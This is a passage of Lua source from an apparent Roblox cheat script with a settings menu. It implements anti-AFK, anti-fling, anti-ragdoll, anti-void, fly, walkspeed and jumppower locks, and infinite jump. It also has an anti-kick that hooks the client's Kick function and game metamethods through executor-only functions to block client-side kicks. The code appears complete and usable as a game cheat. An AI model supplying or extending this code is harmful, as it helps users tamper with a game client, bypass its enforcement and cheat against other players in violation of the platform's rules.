						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
					break
				end
				p = p.Parent
			end
		end
	end
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- DISABLE TOOLTIP
	-- ====================================================================================================
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local tooltip = screenGui:FindFirstChild("Tooltip")
	local uiScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
	
	_G.CreateSlider({
		frame = "tooltipsize",
		groupbox = script,
		tooltip = "Adjusts tooltip sizes. Set to 0 to completely hide it. Default = 1.00.",
		maxvalue = 3,
		default = 1,
		decimalplaces = 2,
		snap = true,
		callback = function(value)
			if uiScale then
				uiScale.Scale = value
			end
		end
	})
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- RESET SETTINGS
	-- ====================================================================================================
	-- ====================================================================================================
	-- RESET SETTINGS
	-- ====================================================================================================
	_G.CreateButton({
		frame = "resetdefault",
		groupbox = script,
		tooltip = "Resets UI Settings to their default.",
		needsConfirm = true,
		confirmMessage = "Please press again...",
		confirmWait = 1.5,
		callback = function()
			-- Reset text size to default (5)
			_G.ConfigData["textsize"] = 5
	
			-- Reset GUI scale to default (1.00)
			_G.ConfigData["guisize_guisize"] = "1.00"
	
			-- Reset tooltip size to default (1.00)
			_G.ConfigData["tooltipsize"] = 1
	
			-- Reset center color picker to default (false)
			_G.ConfigData["centercolorpicker"] = false
	
			-- Reset GUI color theme to default
			_G.ConfigData["guicolortheme_guicolortheme"] = {
				r = 0,
				g = 123,
				b = 255,
				a = 0
			}
	
			-- Save config
			local HttpService = game:GetService("HttpService")
			pcall(function()
				writefile("myconfig.json", HttpService:JSONEncode(_G.ConfigData))
			end)
	
			-- Apply text size reset
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				-- Reset text sizes
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						if originalSizes[obj] then
							obj.TextSize = originalSizes[obj]
						end
					end
				end
	
				-- Update text size slider display
				local textsizeFrame = script.Parent:FindFirstChild("textsize")
				if textsizeFrame then
					local button = textsizeFrame:FindFirstChild("button")
					if button then
						local sliderFrame = button:FindFirstChild("sliderFrame")
						local text = button:FindFirstChild("text")
						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
	
						if fillBar and text then
							fillBar.Size = UDim2.new(0.5, 0, 1, 0)
							text.Text = "5 / 10"
						end
					end
				end
	
				-- Reset GUI scale
				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
				if uiScale then
					uiScale.Scale = 1.00
				end
	
				-- Update GUI size textbox display
				local guisizeFrame = script.Parent:FindFirstChild("guisize")
				if guisizeFrame then
					local textboxFrame = guisizeFrame:FindFirstChild("guisize")
					if textboxFrame then
						local textbox = textboxFrame:FindFirstChild("textbox")
						if textbox then
							textbox.Text = "1.00"
						end
					end
				end
	
				-- Reset tooltip size
				local tooltip = screenGui:FindFirstChild("Tooltip")
				local tooltipScale = tooltip and tooltip:FindFirstChildOfClass("UIScale")
				if tooltipScale then
					tooltipScale.Scale = 1.00
				end
	
				-- Update tooltip size slider display
				local tooltipsizeFrame = script.Parent:FindFirstChild("tooltipsize")
				if tooltipsizeFrame then
					local button = tooltipsizeFrame:FindFirstChild("button")
					if button then
						local sliderFrame = button:FindFirstChild("sliderFrame")
						local text = button:FindFirstChild("text")
						local fillBar = sliderFrame and sliderFrame:FindFirstChild("fillbar")
	
						if fillBar and text then
							fillBar.Size = UDim2.new(0.333, 0, 1, 0) -- 1.00 out of 0-3
							text.Text = "1.00 / 3.00"
						end
					end
				end
	
				-- Reset center color picker toggle
				_G.CenterColorPicker = false
	
				-- Reset GUI color theme
				local colorFrame = screenGui:FindFirstChild("Color")
				if colorFrame then
					colorFrame.BackgroundColor3 = Color3.fromRGB(0, 123, 255)
				end
			end
	
			_G.Notify("UI settings reset to default!", 3)
		end,
	})
	
	
	
	
	
	
	
	_G.CreateToggle({
		frame = "centercolorpicker",
		groupbox = script,
		tooltip = "Centers the color picker UI instead of it below the button. Best for phone users.",
		callback = function(isEnabled)
			_G.CenterColorPicker = isEnabled
		end
	})
	
	
	
	
	
	
	
	
	
	
	_G.CreateColorPicker({
		frame = "guicolortheme",
		colorpickerframe = "guicolortheme",
		tooltip = "Pick a color",
		default = Color3.fromRGB(0, 123, 255),
		title = "Change the GUI color",
		alpha = false,
		groupbox = script,
		callback = function(color, alpha)
			-- Find the ScreenGui
			local function getScreenGui()
				local p = script.Parent
				while p do
					if p:IsA("ScreenGui") then return p end
					p = p.Parent
				end
			end
	
			local screenGui = getScreenGui()
			if not screenGui then return end
	
			-- Find the Color frame
			local colorFrame = screenGui:FindFirstChild("Color")
			if colorFrame then
				colorFrame.BackgroundColor3 = color
			end
		end
	})
end;
task.spawn(C_8e);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
local function C_e2()
local script = G2L["e2"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- ANTI AFK
	-- ====================================================================================================
	local afkConnection = nil
	
	_G.CreateToggle({
		frame = "afk",
		groupbox = script,
		tooltip = "Prevents you from disconnecting from being AFK for 20 minutes.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-AFK
				afkConnection = task.spawn(function()
					while isEnabled and _G.ConfigData["afk"] do
						local virtualUser = game:GetService("VirtualUser")
						virtualUser:CaptureController()
						virtualUser:ClickButton2(Vector2.new())
						task.wait(60)
					end
				end)
			else
				-- Disable Anti-AFK
				if afkConnection then
					task.cancel(afkConnection)
					afkConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI FLING
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local antiFlingConnection = nil
	
	_G.CreateToggle({
		frame = "fling",
		groupbox = script,
		tooltip = "Disables collision with other players to prevent you from getting flung.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Fling
				-- Set all current players to no collide
				for _, player in pairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.CanCollide = false
							end
						end
					end
				end
	
				-- Use Stepped for better anti-fling
				if antiFlingConnection then
					antiFlingConnection:Disconnect()
				end
	
				antiFlingConnection = RunService.Stepped:Connect(function()
					if not _G.ConfigData["fling"] then return end
	
					for _, player in pairs(Players:GetPlayers()) do
						if player ~= LocalPlayer and player.Character then
							for _, part in pairs(player.Character:GetDescendants()) do
								if part:IsA("BasePart") then
									part.CanCollide = false
								end
							end
						end
					end
				end)
			else
				-- Disable Anti-Fling
				if antiFlingConnection then
					antiFlingConnection:Disconnect()
					antiFlingConnection = nil
				end
	
				-- Re-enable collision for all players
				for _, player in pairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.CanCollide = true
							end
						end
					end
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI RAGDOLL
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local ragdollConnection = nil
	
	_G.CreateToggle({
		frame = "ragdoll",
		groupbox = script,
		tooltip = "Prevents your character from ragdolling.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Ragdoll
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
						humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
					end
				end
	
				-- Loop to constantly prevent ragdoll
				ragdollConnection = RunService.Heartbeat:Connect(function()
					if not _G.ConfigData["ragdoll"] then return end
	
					local chr = LocalPlayer.Character
					if not chr then return end
	
					local hum = chr:FindFirstChildOfClass("Humanoid")
					if not hum then return end
	
					-- Disable ragdoll constraints
					for _, part in pairs(chr:GetDescendants()) do
						if part:IsA("BallSocketConstraint") or part:IsA("HingeConstraint") then
							if part:FindFirstAncestorOfClass("Motor6D") == nil then
								part.Enabled = false
							end
						end
					end
	
					-- Force humanoid out of ragdoll state
					if hum:GetState() == Enum.HumanoidStateType.Ragdoll or
						hum:GetState() == Enum.HumanoidStateType.FallingDown then
						hum:ChangeState(Enum.HumanoidStateType.GettingUp)
					end
				end)
			else
				-- Disable Anti-Ragdoll
				if ragdollConnection then
					ragdollConnection:Disconnect()
					ragdollConnection = nil
				end
	
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
						humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
					end
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI VOID
	-- ====================================================================================================
	local voidConnection = nil
	
	_G.CreateToggle({
		frame = "void",
		groupbox = script,
		tooltip = "Disables you from dying in the void.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Void
				workspace.FallenPartsDestroyHeight = 0/0
	
				-- Keep it set to NaN even if game tries to change it
				voidConnection = workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight"):Connect(function()
					if not _G.ConfigData["void"] then return end
	
					if workspace.FallenPartsDestroyHeight ~= 0/0 then
						workspace.FallenPartsDestroyHeight = 0/0
					end
				end)
			else
				-- Disable Anti-Void
				if voidConnection then
					voidConnection:Disconnect()
					voidConnection = nil
				end
	
				-- Reset to default Roblox value
				workspace.FallenPartsDestroyHeight = -500
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI GAMEPLAY PAUSED
	-- ====================================================================================================
	local CoreGui = game:GetService("CoreGui")
	local networkPausedConnection = nil
	
	_G.CreateToggle({
		frame = "gameplaypaused",
		groupbox = script,
		tooltip = "Disables 'Gameplay Paused' messages.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Gameplay Paused
				pcall(function()
					if networkPausedConnection then
						networkPausedConnection:Disconnect()
					end
				end)
	
				networkPausedConnection = CoreGui.RobloxGui.ChildAdded:Connect(function(obj)
					if obj.Name == "CoreScripts/NetworkPause" then
						obj:Destroy()
					end
				end)
	
				-- Remove existing pause screen
				pcall(function()
					CoreGui.RobloxGui["CoreScripts/NetworkPause"]:Destroy()
				end)
			else
				-- Disable Anti-Gameplay Paused
				if networkPausedConnection then
					networkPausedConnection:Disconnect()
					networkPausedConnection = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI KICK
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local oldhmmi = nil
	local oldhmmnc = nil
	local oldKickFunction = nil
	
	_G.CreateToggle({
		frame = "kick",
		groupbox = script,
		tooltip = "Prevents only client kicks from kicking you out of the game. Enabling this might cause lag issues.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Kick
				if not hookmetamethod then return end
	
				if hookfunction then
					oldKickFunction = hookfunction(LocalPlayer.Kick, function() end)
				end
	
				oldhmmi = hookmetamethod(game, "__index", function(self, method)
					if self == LocalPlayer and method:lower() == "kick" then
						return error("Expected ':' not '.' calling member function Kick", 2)
					end
					return oldhmmi(self, method)
				end)
	
				oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
					if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
						return
					end
					return oldhmmnc(self, ...)
				end)
			else
				-- Disable Anti-Kick
				if oldKickFunction and hookfunction then
					pcall(function()
						hookfunction(LocalPlayer.Kick, oldKickFunction)
					end)
					oldKickFunction = nil
				end
	
				if oldhmmi and hookmetamethod then
					pcall(function()
						hookmetamethod(game, "__index", oldhmmi)
					end)
					oldhmmi = nil
				end
	
				if oldhmmnc and hookmetamethod then
					pcall(function()
						hookmetamethod(game, "__namecall", oldhmmnc)
					end)
					oldhmmnc = nil
				end
			end
		end
	})
	
	-- ====================================================================================================
	-- ANTI KNOCKBACK
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local RunService = game:GetService("RunService")
	
	local knockbackConnection = nil
	
	_G.CreateToggle({
		frame = "knockback",
		groupbox = script,
		tooltip = "Prevents your character from getting knockback.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Anti-Knockback
				knockbackConnection = RunService.Heartbeat:Connect(function()
					if not _G.ConfigData["knockback"] then return end
	
					local character = LocalPlayer.Character
					if not character then return end
	
					local hrp = character:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					-- Cancel horizontal velocity, keep vertical (for jumping/falling)
					hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
					hrp.AssemblyAngularVelocity = Vector3.zero
				end)
			else
				-- Disable Anti-Knockback
				if knockbackConnection then
					knockbackConnection:Disconnect()
					knockbackConnection = nil
				end
			end
		end
	})
	
end;
task.spawn(C_e2);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
local function C_144()
local script = G2L["144"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	-- ====================================================================================================
	-- FORCE R6
	-- ====================================================================================================
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local AnimCache = {}
	local r6Connection = nil
	
	-- R6 Animation IDs (standard Roblox R6 animations)
	local Animations = {
		Run = {
			RunAnim = 180426354
		},
		Walk = {
			WalkAnim = 180426354
		},
		Jump = {
			JumpAnim = 125750702
		},
		Idle = {
			Animation1 = 180435571,
			Animation2 = 180435571
		},
		Fall = {
			FallAnim = 180436148
		},
		Climb = {
			ClimbAnim = 180436334
		},
		Sit = {
			SitAnim = 178130996
		}
	}
	
	local function StopAnimations(Humanoid)
		for _, Animation in Humanoid:GetPlayingAnimationTracks() do
			Animation:Stop()
		end
	end
	
	local function LoadAnimations(Animate)
		AnimCache = {}
		for Animation, Child in Animations do
			for ChildName, ID in Child do
				local Found = Animate:FindFirstChild(Animation:lower())
				if not Found then continue end
	
				local Child = Found:FindFirstChild(ChildName)
				if not Child then continue end
	
				table.insert(AnimCache, {Child, Child.AnimationId})
				Child.AnimationId = ("rbxassetid://%s"):format(ID)
			end
		end
	end
	
	local function Animate(Character)
		local Humanoid = Character:WaitForChild("Humanoid")
		local Animate = Character:WaitForChild("Animate")
	
		task.wait(0.5)
	
		StopAnimations(Humanoid)
		LoadAnimations(Animate)
		StopAnimations(Humanoid)
	end
	
	_G.CreateToggle({
		frame = "R6",
		groupbox = script,
		tooltip = "Forces your character's rig type to R6.",
		callback = function(isEnabled)
			if isEnabled then
				-- Enable Force R6
				local function HandleCharacter(Char)
					if not Char then return end
	
					local Hum = Char:WaitForChild("Humanoid")
					if not Hum or Hum.RigType ~= Enum.HumanoidRigType.R15 then return end
	
					Animate(Char)
				end
	
				HandleCharacter(LocalPlayer.Character)
				r6Connection = LocalPlayer.CharacterAdded:Connect(HandleCharacter)
			else
				-- Disable Force R6
				if r6Connection then
					r6Connection:Disconnect()
					r6Connection = nil
				end
	
				local Char = LocalPlayer.Character
				if not Char then return end
	
				local Hum = Char:FindFirstChildOfClass("Humanoid")
				if not Hum or Hum.RigType ~= Enum.HumanoidRigType.R15 then return end
	
				StopAnimations(Hum)
				for _, Data in AnimCache do
					local Child, Id = Data[1], Data[2]
					if not Child then continue end
	
					Child.AnimationId = Id
				end
				StopAnimations(Hum)
	
				AnimCache = {}
			end
		end
	})
	
	
	
	
	
	
	-- ====================================================================================================
	-- RESET CHARACTER
	-- ====================================================================================================
	_G.CreateButton({
		frame = "Reset",
		groupbox = script,
		tooltip = "Resets your character, hold for 1 second.",
		afterMessage = "Character reset!",
		afterMessageWait = 1,
		canClickDuringAfter = true,
		holdtime = 1,
		holdtext = "Hold... (%.1fs)",
		holdvisual = true,
		holdtextcolor = "frameColor",
		callback = function()
			if shared.ResetCharacter then
				shared.ResetCharacter()
				return true
			end
			return false
		end,
	})
	
	
	
	
	
	
	
end;
task.spawn(C_144);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.movementScript
local function C_165()
local script = G2L["165"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	
	
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local LocalPlayer = Players.LocalPlayer
	
	local FLYING = false
	local iyflyspeed = 1
	local flyKeyDown = nil
	local flyKeyUp = nil
	
	local function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
	end
	
	local function NOFLY()
		FLYING = false
		if flyKeyDown then flyKeyDown:Disconnect() flyKeyDown = nil end
		if flyKeyUp then flyKeyUp:Disconnect() flyKeyUp = nil end
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
			LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
	end
	
	local function sFLY()
		local char = LocalPlayer.Character
		if not char then return end
	
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not humanoid then return end
	
		if flyKeyDown or flyKeyUp then
			if flyKeyDown then flyKeyDown:Disconnect() end
			if flyKeyUp then flyKeyUp:Disconnect() end
		end
	
		local T = getRoot(char)
		if not T then return end
	
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0
	
		local function FLY()
			FLYING = true
			local BG = Instance.new('BodyGyro')
			local BV = Instance.new('BodyVelocity')
			BG.P = 9e4
			BG.Parent = T
			BV.Parent = T
			BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.CFrame = T.CFrame
			BV.Velocity = Vector3.new(0, 0, 0)
			BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
	
			task.spawn(function()
				repeat task.wait()
					local camera = workspace.CurrentCamera
					if humanoid then
						humanoid.PlatformStand = true
					end
	
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
	
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.Velocity = ((camera.CFrame.LookVector * (lCONTROL.F + lCONTROL.B)) + ((camera.CFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
					else
						BV.Velocity = Vector3.new(0, 0, 0)
					end
					BG.CFrame = camera.CFrame
				until not FLYING
	
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:Destroy()
				BV:Destroy()
	
				if humanoid then humanoid.PlatformStand = false end
			end)
		end
	
		flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
			if processed then return end
			if input.KeyCode == Enum.KeyCode.W then
				CONTROL.F = iyflyspeed
			elseif input.KeyCode == Enum.KeyCode.S then
				CONTROL.B = -iyflyspeed
			elseif input.KeyCode == Enum.KeyCode.A then
				CONTROL.L = -iyflyspeed
			elseif input.KeyCode == Enum.KeyCode.D then
				CONTROL.R = iyflyspeed
			elseif input.KeyCode == Enum.KeyCode.E then
				CONTROL.Q = iyflyspeed * 2
			elseif input.KeyCode == Enum.KeyCode.Q then
				CONTROL.E = -iyflyspeed * 2
			end
			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
		end)
	
		flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
			if processed then return end
			if input.KeyCode == Enum.KeyCode.W then
				CONTROL.F = 0
			elseif input.KeyCode == Enum.KeyCode.S then
				CONTROL.B = 0
			elseif input.KeyCode == Enum.KeyCode.A then
				CONTROL.L = 0
			elseif input.KeyCode == Enum.KeyCode.D then
				CONTROL.R = 0
			elseif input.KeyCode == Enum.KeyCode.E then
				CONTROL.Q = 0
			elseif input.KeyCode == Enum.KeyCode.Q then
				CONTROL.E = 0
			end
		end)
	
		FLY()
	end
	
	_G.CreateTextbox({
		frame = "Fly",
		textboxname = "FlyChanger",
		tooltip = "Change your fly speed, default is 50.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
			if value then
				iyflyspeed = value / 50 -- Normalize to speed multiplier
			end
		end
	})
	
	_G.CreateToggle({
		frame = "Fly",
		groupbox = script,
		tooltip = "Enables fly mode. Use the textbox to adjust speed.",
		callback = function(isEnabled)
			if isEnabled then
				sFLY()
			else
				NOFLY()
			end
		end
	})
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- WALKSPEED CONFIGS
	-- ====================================================================================================
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")
	
	local walkspeedValue = 16
	local walkspeedEnabled = false
	local walkspeedLoop = nil
	
	_G.CreateTextbox({
		frame = "Walkspeed",
		textboxname = "WalkspeedChanger",
		tooltip = "Change your walk speed, default is 16.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
			if value then
				walkspeedValue = value
	
				-- Only apply if walkspeed is enabled
				if walkspeedEnabled then
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.WalkSpeed = walkspeedValue
						end
					end
				end
			end
		end
	})
	_G.CreateToggle({
		frame = "Walkspeed",
		groupbox = script,
		tooltip = "Locks your walkspeed to what speed is set. Use the textbox to adjust speed.",
		callback = function(isEnabled)
			walkspeedEnabled = isEnabled
	
			if isEnabled then
				-- Start walkspeed lock loop
				walkspeedLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.WalkSpeed = walkspeedValue
						end
					end
				end)
			else
				-- Stop loop and reset to default
				if walkspeedLoop then
					walkspeedLoop:Disconnect()
					walkspeedLoop = nil
				end
	
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid.WalkSpeed = 16
					end
				end
			end
		end
	})
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- JUMPPOWER
	-- ====================================================================================================
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")
	
	local jumppowerValue = 50
	local jumppowerEnabled = false
	local jumppowerLoop = nil
	
	_G.CreateTextbox({
		frame = "Jumppower",
		textboxname = "JumppowerChanger",
		tooltip = "Change your jump power, default is 50.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
			if value then
				jumppowerValue = value
	
				-- Only apply if jumppower is enabled
				if jumppowerEnabled then
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.UseJumpPower = true
							humanoid.JumpPower = jumppowerValue
						end
					end
				end
			end
		end
	})
	
	_G.CreateToggle({
		frame = "Jumppower",
		groupbox = script,
		tooltip = "Locks your jumppower to what number is set. Use the textbox to adjust power.",
		callback = function(isEnabled)
			jumppowerEnabled = isEnabled
	
			if isEnabled then
				-- Start jumppower lock loop
				jumppowerLoop = RunService.Heartbeat:Connect(function()
					local character = LocalPlayer.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.UseJumpPower = true
							humanoid.JumpPower = jumppowerValue
						end
					end
				end)
			else
				-- Stop loop and reset to default
				if jumppowerLoop then
					jumppowerLoop:Disconnect()
					jumppowerLoop = nil
				end
	
				local character = LocalPlayer.Character
				if character then
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid.UseJumpPower = true
						humanoid.JumpPower = 50
					end
				end
			end
		end
	})
	
	
	
	
	
	
	
	
	
	-- ====================================================================================================
	-- INF JUMP
	-- ====================================================================================================
	_G.CreateToggle({
		frame = "InfJump",
		groupbox = script,
		tooltip = "Allows you to jump in the air infinitely.",
		callback = function(isEnabled)
			if isEnabled then
				local UserInputService = game:GetService("UserInputService")
				local LocalPlayer = game:GetService("Players").LocalPlayer
	
				_G.InfJumpConn = UserInputService.JumpRequest:Connect(function()
					local character = LocalPlayer.Character
					if not character then return end
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end
				end)
			else
				if _G.InfJumpConn then
					_G.InfJumpConn:Disconnect()
					_G.InfJumpConn = nil
				end
			end
		end
	})
end;
task.spawn(C_165);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
local function C_219()
local script = G2L["219"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox and _G.CreateSlider and _G.CreateDropdown
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
